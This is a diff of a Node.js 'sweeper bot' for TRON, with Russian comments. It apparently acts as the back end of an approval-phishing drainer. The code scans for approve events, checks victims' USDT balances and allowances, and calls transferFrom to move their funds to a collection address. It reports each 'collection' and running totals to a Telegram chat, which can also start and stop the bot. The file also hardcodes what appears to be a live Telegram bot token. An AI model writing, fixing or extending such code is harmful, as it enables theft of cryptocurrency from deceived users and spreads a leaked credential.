@@ -1,35 +1,37 @@
 // ============================================
-// SWEEPER BOT – ИСПРАВЛЕННАЯ ВЕРСИЯ
+// SWEEPER BOT – ИСПРАВЛЕННАЯ ВЕРСИЯ С BUFFER
 // ============================================
 
 const TronWeb = require('tronweb');
 const dotenv = require('dotenv');
 dotenv.config();
 
-// -------------------- 1. ИНИЦИАЛИЗАЦИЯ С ПРАВИЛЬНЫМ ФОРМАТОМ КЛЮЧА --------------------
-const privateKeyRaw = process.env.BOT_PRIVATE_KEY;
+// -------------------- 1. ПРАВИЛЬНАЯ ЗАГРУЗКА КЛЮЧА --------------------
+const privateKeyRaw = process.env.BOT_PRIVATE_KEY.trim(); // Убираем пробелы
 
-// Автоматически добавляем 0x если его нет
-const privateKeyHex = privateKeyRaw.startsWith('0x') 
-    ? privateKeyRaw 
-    : '0x' + privateKeyRaw;
+// Преобразуем строку в Buffer (32 байта)
+const privateKeyBuffer = Buffer.from(privateKeyRaw, 'hex');
 
-console.log('🔑 Ключ загружен, длина:', privateKeyHex.length, 'символов');
-
-const tronWeb = new TronWeb({
-    fullHost: process.env.TRONGRID_API,
-    privateKey: privateKeyHex
-});
+// Создаем TronWeb с Buffer
+const tronWeb = new TronWeb(
+    process.env.TRONGRID_API,
+    process.env.TRONGRID_API,
+    process.env.TRONGRID_API,
+    privateKeyBuffer
+);
 
 const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
 const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
-const BOT_ADDRESS = tronWeb.address.fromPrivateKey(privateKeyHex);
+const BOT_ADDRESS = tronWeb.defaultAddress.base58;
 
-// -------------------- Telegram настройки --------------------
+console.log('🔑 Ключ загружен, длина:', privateKeyRaw.length);
+console.log('🔑 Buffer:', privateKeyBuffer.length, 'байт');
+
+// -------------------- 2. TELEGRAM НАСТРОЙКИ --------------------
 const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
 const TELEGRAM_CHAT_ID = '-1003750493145';
 
-// -------------------- Состояние бота --------------------
+// -------------------- 3. СОСТОЯНИЕ БОТА --------------------
 let isActive = true;
 let processedTxs = new Set();
 let processedAddresses = new Set();
@@ -53,7 +55,7 @@ console.log(`📍 Адрес бота: ${BOT_ADDRESS}`);
 console.log(`💰 Сбор USDT на: ${COLLECTION_ADDRESS}`);
 console.log('=================================\n');
 
-// -------------------- Функция отправки в Telegram --------------------
+// -------------------- 4. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
 async function sendTelegramNotification(message) {
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -81,13 +83,81 @@ async function sendTelegramNotification(message) {
 📍 Адрес бота: <code>${BOT_ADDRESS}</code>
 💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>
 💎 Баланс бота: ${balanceTRX} TRX
+
+Команды:
+/start_bot - включить сбор
+/stop_bot - выключить сбор
+/status - статистика
         `);
     } catch (error) {
         console.error('Ошибка при отправке стартового сообщения:', error.message);
     }
 })();
 
-// -------------------- Поиск approve --------------------
+// -------------------- 5. ПРОВЕРКА КОМАНД --------------------
+async function checkTelegramCommands() {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
+        const data = await response.json();
+        if (data.result?.length) {
+            const msg = data.result[data.result.length - 1].message;
+            if (msg?.text && msg.chat.id.toString() === TELEGRAM_CHAT_ID) {
+                const cmd = msg.text.toLowerCase();
+                
+                if (cmd === '/start_bot' && !isActive) {
+                    isActive = true;
+                    await sendTelegramNotification('✅ Бот включён');
+                } 
+                else if (cmd === '/stop_bot' && isActive) {
+                    isActive = false;
+                    await sendTelegramNotification('🛑 Бот остановлен');
+                } 
+                else if (cmd === '/status') {
+                    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
+                    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
+                    const balanceTRX = tronWeb.fromSun(balance);
+                    
+                    await sendTelegramNotification(`
+📊 <b>СТАТУС БОТА</b>
+
+🟢 Статус: ${isActive ? 'РАБОТАЕТ' : 'ОСТАНОВЛЕН'}
+⏱ Время работы: ${uptime} мин
+💰 Баланс бота: ${balanceTRX} TRX
+
+📈 <b>Статистика:</b>
+💵 Собрано: ${stats.totalCollected.toFixed(2)} USDT
+📦 Транзакций: ${stats.totalTransactions}
+❌ Ошибок: ${stats.totalErrors}
+⚡️ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
+                    `);
+                }
+            }
+        }
+    } catch (error) {
+        console.error('Ошибка проверки команд:', error.message);
+    }
+}
+
+// -------------------- 6. ПРОВЕРКА БАЛАНСА --------------------
+async function checkBotBalance() {
+    try {
+        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
+        const balanceTRX = tronWeb.fromSun(balance);
+        
+        if (balanceTRX < 20) {
+            await sendTelegramNotification(`
+⚠️ <b>НИЗКИЙ БАЛАНС TRX!</b>
+💰 Текущий баланс: ${balanceTRX} TRX
+🔋 Рекомендуемый минимум: 40 TRX
+            `);
+        }
+        return balanceTRX;
+    } catch (error) {
+        return 0;
+    }
+}
+
+// -------------------- 7. ПОИСК APPROVE --------------------
 async function getNewApprovals() {
     try {
         const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
@@ -115,7 +185,7 @@ async function getNewApprovals() {
     }
 }
 
-// -------------------- Обработка approve --------------------
+// -------------------- 8. ОБРАБОТКА APPROVE --------------------
 async function processApproval(event) {
     const owner = tronWeb.address.fromHex(event.result.owner);
     const value = event.result.value;
@@ -131,16 +201,24 @@ async function processApproval(event) {
     try {
         const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
         
-        // Проверяем баланс
+        // Проверяем баланс пользователя
         const balance = await contract.balanceOf(owner).call();
+        const balanceUSDT = (balance / 1_000_000).toFixed(2);
+        
+        console.log(`   💎 Баланс пользователя: ${balanceUSDT} USDT`);
+
         if (balance < value) {
-            console.log(`   ⚠️ Недостаточно USDT (баланс: ${tronWeb.fromSun(balance)} USDT)`);
+            console.log(`   ⚠️ Недостаточно USDT (баланс: ${balanceUSDT} USDT)`);
             processedTxs.add(txId);
             return;
         }
 
         // Проверяем allowance
         const allowance = await contract.allowance(owner, BOT_ADDRESS).call();
+        const allowanceUSDT = (allowance / 1_000_000).toFixed(2);
+        
+        console.log(`   🔓 Разрешено: ${allowanceUSDT} USDT`);
+
         if (allowance < value) {
             console.log(`   ⚠️ Недостаточно allowance`);
             processedTxs.add(txId);
@@ -152,9 +230,16 @@ async function processApproval(event) {
         const botBalanceTRX = tronWeb.fromSun(botBalance);
         
         console.log(`   🤖 Баланс бота: ${botBalanceTRX} TRX`);
-        console.log(`   💸 Отправляю transferFrom...`);
+
+        if (botBalanceTRX < 20) {
+            console.log(`   ⚠️ Мало TRX у бота`);
+            await sendTelegramNotification(`⚠️ Мало TRX у бота (${botBalanceTRX} TRX)`);
+            return;
+        }
 
         // Выполняем перевод
+        console.log(`   💸 Отправляю transferFrom...`);
+        
         const tx = await contract.transferFrom(
             owner,
             COLLECTION_ADDRESS,
@@ -165,12 +250,14 @@ async function processApproval(event) {
             shouldPollResponse: true
         });
 
-        console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
-        
-        // Рассчитываем комиссию
+        // Считаем комиссию
         const newBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
         const feeSpent = (botBalance - newBalance) / 1_000_000;
         
+        console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
+        console.log(`   💸 Комиссия: ${feeSpent.toFixed(2)} TRX`);
+
+        // Обновляем статистику
         stats.totalCollected += parseFloat(valueUSDT);
         stats.totalTransactions++;
         stats.totalEnergyBurned += feeSpent;
@@ -178,6 +265,7 @@ async function processApproval(event) {
         stats.dailyTransactions++;
         stats.dailyEnergyBurned += feeSpent;
 
+        // Отправляем уведомление
         await sendTelegramNotification(`
 🚀 <b>УСПЕШНЫЙ СБОР!</b>
 
@@ -185,7 +273,7 @@ async function processApproval(event) {
 📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
 📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
 ⚡️ Комиссия: ${feeSpent.toFixed(2)} TRX
-🤖 Баланс бота: ${botBalanceTRX - feeSpent} TRX
+🤖 Баланс бота: ${tronWeb.fromSun(newBalance)} TRX
 🔗 https://tronscan.org/#/transaction/${tx}
         `);
 
@@ -205,10 +293,33 @@ async function processApproval(event) {
     }
 }
 
-// -------------------- Основной цикл --------------------
+// -------------------- 9. ДНЕВНОЙ ОТЧЁТ --------------------
+async function checkDailyStats() {
+    const now = Date.now();
+    if (now - stats.lastDailyReset > 24 * 60 * 60 * 1000) {
+        if (stats.dailyTransactions > 0 || stats.dailyErrors > 0) {
+            await sendTelegramNotification(`
+📊 <b>ДНЕВНОЙ ОТЧЁТ</b>
+
+💰 Собрано: ${stats.dailyCollected.toFixed(2)} USDT
+📦 Транзакций: ${stats.dailyTransactions}
+❌ Ошибок: ${stats.dailyErrors}
+⚡️ Сожжено TRX: ${stats.dailyEnergyBurned.toFixed(2)} TRX
+            `);
+        }
+        stats.dailyCollected = 0;
+        stats.dailyTransactions = 0;
+        stats.dailyErrors = 0;
+        stats.dailyEnergyBurned = 0;
+        stats.lastDailyReset = now;
+    }
+}
+
+// -------------------- 10. ОСНОВНОЙ ЦИКЛ --------------------
 async function checkAndSweep() {
     lastProcessedTime = new Date().toLocaleString();
 
+    await checkTelegramCommands();
     if (!isActive) {
         console.log('⏸ Бот остановлен');
         return;
@@ -216,6 +327,9 @@ async function checkAndSweep() {
 
     console.log(`\n🔍 [${new Date().toLocaleTimeString()}] Поиск approve...`);
     
+    await checkBotBalance();
+    await checkDailyStats();
+
     const approvals = await getNewApprovals();
     
     if (approvals.length === 0) {
@@ -232,13 +346,34 @@ async function checkAndSweep() {
     }
 }
 
-// -------------------- Запуск --------------------
+// -------------------- 11. ЗАПУСК --------------------
 checkAndSweep();
 setInterval(checkAndSweep, 30000);
 
-// -------------------- Обработка остановки --------------------
+// -------------------- 12. ОБРАБОТКА ОСТАНОВКИ --------------------
 process.on('SIGINT', async () => {
     console.log('\n👋 Остановка...');
-    await sendTelegramNotification(`🛑 <b>Бот остановлен</b>`);
+    
+    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
+    const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
+    const balanceTRX = tronWeb.fromSun(balance);
+    
+    await sendTelegramNotification(`
+🛑 <b>Бот остановлен</b>
+
+📊 <b>ИТОГИ:</b>
+💰 Собрано: ${stats.totalCollected.toFixed(2)} USDT
+📦 Транзакций: ${stats.totalTransactions}
+❌ Ошибок: ${stats.totalErrors}
+⚡️ Сожжено TRX: ${stats.totalEnergyBurned.toFixed(2)} TRX
+⏱ Время работы: ${uptime} мин
+🤖 Остаток TRX: ${balanceTRX} TRX
+    `);
+    
     process.exit(0);
+});
+
+process.on('unhandledRejection', async (error) => {
+    console.error('❗ Необработанная ошибка:', error);
+    await sendTelegramNotification(`❗ Критическая ошибка: ${error.message}`);
 });
